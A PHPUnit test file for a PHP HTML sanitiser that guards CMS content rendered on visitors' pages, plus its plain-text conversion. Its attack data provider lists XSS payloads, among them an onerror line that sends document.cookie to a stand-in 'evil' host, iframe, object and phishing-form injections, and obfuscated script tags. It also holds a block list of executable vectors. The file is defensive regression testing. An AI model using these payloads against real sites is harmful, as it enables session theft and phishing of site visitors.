<?php

namespace Tests\Unit;

use App\Support\HtmlSanitiser;
use PHPUnit\Framework\Attributes\DataProvider;
use Tests\TestCase;

/**
 * HtmlSanitiser is the only thing between a content-manager account and
 * script running on every visitor's page — the frontend renders these bodies
 * with dangerouslySetInnerHTML. These tests exist so that widening the
 * allowlist in config/purifier.php can never quietly reopen a hole.
 */
class HtmlSanitiserTest extends TestCase
{
    /** Vectors that must never survive, whatever the input was. */
    private const EXECUTABLE = [
        '<script', '<iframe', '<form', '<svg', '<object', '<embed',
        'javascript:', 'data:text/html',
        'onerror', 'onclick', 'onload', 'onmouseover',
        'style=',
    ];

    public static function attacks(): array
    {
        return [
            'script tag' => ['<p>Hi</p><script>alert(document.cookie)</script>'],
            'onerror attribute' => ['<img src=x onerror="fetch(\'//evil/\'+document.cookie)">'],
            'javascript: href' => ['<a href="javascript:alert(1)">click</a>'],
            'iframe' => ['<p>a</p><iframe src="//evil.example"></iframe>'],
            'onclick attribute' => ['<p onclick="alert(1)">text</p>'],
            'inline style' => ['<p style="position:fixed;top:0">overlay</p>'],
            'svg onload' => ['<svg/onload=alert(1)>'],
            'data URI image' => ['<img src="data:text/html;base64,PHNjcmlwdD4=">'],
            'phishing form' => ['<form action="//evil"><input name="pw"></form>'],
            'nested obfuscation' => ['<p><scr<script>ipt>alert(1)</scr</script>ipt></p>'],
            'uppercase script' => ['<SCRIPT>alert(1)</SCRIPT>'],
            'object embed' => ['<object data="//evil"></object>'],
        ];
    }

    #[DataProvider('attacks')]
    public function test_it_strips_executable_content(string $dirty): void
    {
        $clean = (string) HtmlSanitiser::clean($dirty);

        foreach (self::EXECUTABLE as $vector) {
            $this->assertStringNotContainsStringIgnoringCase(
                $vector,
                $clean,
                "{$vector} survived sanitisation of: {$dirty}"
            );
        }
    }

    public function test_it_keeps_the_markup_prose_styles(): void
    {
        $clean = (string) HtmlSanitiser::clean(
            '<p>A firewall policy is not static.</p>'
            .'<h2>The stale object problem</h2><h3>Detail</h3>'
            .'<ul><li>Audit quarterly</li><li>Prefer <strong>FQDN</strong> objects</li></ul>'
            .'<ol><li>First</li></ol>'
            .'<p>See <a href="https://example.com/doc">the doc</a>, or <em>ask</em>.</p>'
            .'<blockquote>Worth quoting.</blockquote><p><code>iptables -L</code></p>'
            .'<table><thead><tr><th scope="col">Port</th></tr></thead><tbody><tr><td>443</td></tr></tbody></table>'
        );

        foreach (['<h2>', '<h3>', '<ul>', '<ol>', '<li>', '<strong>', '<em>',
            '<blockquote>', '<code>', '<table>', '<th scope="col">', '<td>'] as $kept) {
            $this->assertStringContainsString($kept, $clean);
        }

        $this->assertStringContainsString('href="https://example.com/doc"', $clean);
    }

    /**
     * An emptied editor posts markup, not "". Everything downstream — the
     * reading-time hook, "is this publishable" — should see that as empty.
     */
    public function test_it_normalises_an_emptied_editor_to_null(): void
    {
        $this->assertNull(HtmlSanitiser::clean('<p>&nbsp;</p>'));
        $this->assertNull(HtmlSanitiser::clean('<p></p>'));
        $this->assertNull(HtmlSanitiser::clean('   '));
        $this->assertNull(HtmlSanitiser::clean(''));
        $this->assertNull(HtmlSanitiser::clean(null));
    }

    public function test_it_keeps_an_image_only_body(): void
    {
        $clean = (string) HtmlSanitiser::clean('<p><img src="/storage/media/diagram.png" alt="Rack layout"></p>');

        $this->assertStringContainsString('<img', $clean);
        $this->assertStringContainsString('alt="Rack layout"', $clean);
    }

    /**
     * toText() feeds every derived meta description and the plain-text half
     * of the notification emails.
     *
     * strip_tags on its own deletes a tag without putting anything in its
     * place, so the end of one block ran into the start of the next: the
     * downloads page published "…asked for.Remote supportWhen an engineer…"
     * as its meta description, which is what a search engine showed.
     */
    public function test_it_puts_a_space_where_a_block_element_was(): void
    {
        $html = '<p>asked for.</p><h2>Remote support</h2><p>When an engineer.</p>';

        $this->assertSame(
            'asked for. Remote support When an engineer.',
            HtmlSanitiser::toText($html)
        );
    }

    /**
     * The other direction is just as wrong. An inline tag is inside a word as
     * often as it is around one, so spacing every tag would break the word.
     */
    public function test_it_does_not_split_a_word_at_an_inline_tag(): void
    {
        $this->assertSame('tenths of a second', HtmlSanitiser::toText('<p>ten<strong>ths</strong> of a second</p>'));
        $this->assertSame('A & B C', HtmlSanitiser::toText('<p>A &amp; B&nbsp;C</p>'));
    }

    public function test_it_separates_list_items_and_line_breaks(): void
    {
        $this->assertSame('alpha beta', HtmlSanitiser::toText('<ul><li>alpha</li><li>beta</li></ul>'));
        $this->assertSame('one two', HtmlSanitiser::toText('<p>one<br>two</p>'));
        $this->assertSame('one two', HtmlSanitiser::toText('<p>one<br />two</p>'));
    }

    public function test_it_collapses_whitespace_and_handles_empty_input(): void
    {
        $this->assertSame('a b', HtmlSanitiser::toText("<p>a</p>\n\n   <p>b</p>"));
        $this->assertSame('', HtmlSanitiser::toText(null));
        $this->assertSame('', HtmlSanitiser::toText(''));
        $this->assertSame('Just a sentence.', HtmlSanitiser::toText('Just a sentence.'));
    }
}
